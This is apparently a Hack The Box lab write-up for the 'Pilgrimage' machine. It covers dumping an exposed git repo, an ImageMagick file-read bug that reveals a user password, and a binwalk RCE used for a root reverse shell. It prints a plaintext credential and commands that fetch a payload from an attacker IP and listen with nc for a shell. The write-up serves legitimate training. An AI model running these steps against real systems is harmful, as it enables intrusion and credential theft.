---
title: "Hackthebox Writeup Pilgrimage"
date: 2023-07-08T16:04:50+08:00
toc: true
draft: false
tags: [hackthebox]
---

<!--more-->

# User Shell

We found .git directory from nmap

![](https://i.imgur.com/zDIJgzy.png)   

We can use git-dumper to dump the git repo

```bash 
./git_dumper.py http://pilgrimage.htb/.git dump
``` 
 
We found a binary file magick, google it we found a poc
https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

```
total 26972
drwxr-xr-x 5 kali kali     4096 Jul  8 02:30 .
drwxr-xr-x 4 kali kali     4096 Jul  8 04:44 ..
drwxr-xr-x 6 kali kali     4096 Jul  8 02:30 assets
-rwxr-xr-x 1 kali kali     5538 Jul  8 02:30 dashboard.php
drwxr-xr-x 7 kali kali     4096 Jul  8 02:30 .git
-rwxr-xr-x 1 kali kali     9250 Jul  8 02:30 index.php
-rwxr-xr-x 1 kali kali     6822 Jul  8 02:30 login.php
-rwxr-xr-x 1 kali kali       98 Jul  8 02:30 logout.php
-rwxr-xr-x 1 kali kali 27555008 Jul  8 02:30 magick
-rwxr-xr-x 1 kali kali     6836 Jul  8 02:30 register.php
drwxr-xr-x 4 kali kali     4096 Jul  8 02:30 vendor

```
 
We now can read any file we want, from the source code, we found "sqlite:/var/db/pilgrimage"

![Imgur](https://i.imgur.com/k15YNzy.png)
Read that file, we can find the password of emily

`emily : abigchonkyboi123`

Then we are able to ssh with emaily

# Root

From linpeas reuslt, we can find a file “/usr/sbin/malwarescan.sh” executed by root
![Imgur](https://i.imgur.com/4dsfHLx.png)

![Imgur](https://i.imgur.com/sppCU1a.png)

By reading the content, the script means:
1. notice new created any file in "/var/www/pilgrimage.htb/shrunk/"
2. binwalk the new files
3. If the file containsed blacklist, it will remove it


the binwalk location is intersting, we dry run it once

![Imgur](https://i.imgur.com/Wb4uAYx.png)

We could knew it is v2.3.2, google it, we will find it has a RCE vulnerability.

As a result, we use the poc to gain the root reverse shell
https://www.exploit-db.com/exploits/51249
```
# In host:
python3 lpe.py shit.png 10.10.14.35 443

nc -lvnp 443

# In victim:
wget 10.10.14.35/binwalk_exploit.png
```
